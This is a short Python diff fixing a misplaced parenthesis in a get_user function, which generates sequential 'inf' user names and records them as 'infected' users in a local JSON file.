@@ -835,7 +835,7 @@ def get_user():
     with open(os.path.join(STATIC_FOLDER, "users.json"), "r") as file:
         target = json.load(file)
     inf_users = target["infected"]
-    user = f"inf{len(inf_users+1)}"
+    user = f"inf{len(inf_users)+1}"
     target["infected"].append(user)
     target["users"].append(user)
     with open(os.path.join(STATIC_FOLDER, "users.json"), "w") as file:
